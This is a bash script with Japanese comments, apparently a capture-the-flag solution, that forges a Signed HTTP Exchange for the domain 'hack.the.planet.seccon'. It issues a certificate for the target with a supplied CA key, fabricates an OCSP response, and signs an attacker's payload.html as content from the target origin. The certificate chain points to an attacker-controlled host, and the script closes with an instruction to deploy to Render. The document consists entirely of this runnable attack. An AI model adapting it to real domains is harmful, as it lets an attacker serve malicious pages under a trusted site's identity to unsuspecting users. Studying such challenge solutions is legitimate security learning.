#!/bin/bash

# --- 設定項目 (ここをあなたの環境に合わせてください) ---
TARGET_DOMAIN="hack.the.planet.seccon"
ATTACKER_HOST="自分の攻撃サイトのホスト名"  # https:// は無しで
# ---------------------------------------------------

echo "[*] Cleaning up old files..."
rm -f exploit.crt exploit.csr exploit.sxg cert.cbor ocsp.req ocsp.der index.txt

echo "[*] Generating fresh Server Key (exploit.key)..."
# 既にキーがある場合はそのまま使います
if [ ! -f exploit.key ]; then
    openssl ecparam -genkey -name prime256v1 -out exploit.key
fi

echo "[*] Generating CSR..."
openssl req -new -key exploit.key -out exploit.csr -subj "/CN=${TARGET_DOMAIN}/O=Evil Corp"

echo "[*] Creating sxg.ext..."
cat <<EOF > sxg.ext
basicConstraints=CA:FALSE
subjectAltName=DNS:${TARGET_DOMAIN}
1.3.6.1.4.1.11129.2.1.22=ASN1:NULL
EOF

echo "[*] Issuing Certificate (exploit.crt)..."
# ここで新しいシリアル番号が振られます
openssl x509 -req -days 90 -in exploit.csr \
    -CA cert.crt -CAkey cert.key -CAcreateserial \
    -out exploit.crt -extfile sxg.ext

echo "[*] Extracting Serial Number..."
# 新しい証明書からシリアル番号を確実に抜き出します
SERIAL=$(openssl x509 -in exploit.crt -serial -noout | cut -d= -f2)
echo "    -> Serial: ${SERIAL}"

echo "[*] Creating OCSP Database (index.txt)..."
# タブ区切りでデータベースを作成
echo -e "V\t301231235959Z\t\t${SERIAL}\tunknown\t/CN=${TARGET_DOMAIN}" > index.txt

echo "[*] Generating OCSP Request & Response..."
openssl ocsp -issuer cert.crt -cert exploit.crt -reqout ocsp.req
openssl ocsp -index index.txt -rsigner cert.crt -rkey cert.key -CA cert.crt \
    -reqin ocsp.req -respout ocsp.der -ndays 7

echo "[*] Generating Certificate Chain (cert.cbor)..."
gen-certurl -pem exploit.crt -ocsp ocsp.der > cert.cbor

echo "[*] Generating SXG (exploit.sxg)..."
# 時刻ズレ対策: dateを「1時間前」に設定し、有効期限を72時間に
# dateコマンドはLinux(GNU)とMac(BSD)で違うため、Linux想定で書きます
PAST_DATE=$(date -u -d "1 hour ago" +"%Y-%m-%dT%H:%M:%SZ")

gen-signedexchange \
  -uri https://${TARGET_DOMAIN}/ \
  -content payload.html \
  -certificate exploit.crt \
  -privateKey exploit.key \
  -certUrl https://${ATTACKER_HOST}/cert.cbor \
  -validityUrl https://${TARGET_DOMAIN}/resource.validity \
  -date ${PAST_DATE} \
  -expire 72h \
  -o exploit.sxg

echo "[*] Done! Please deploy 'exploit.sxg' and 'cert.cbor' to Render."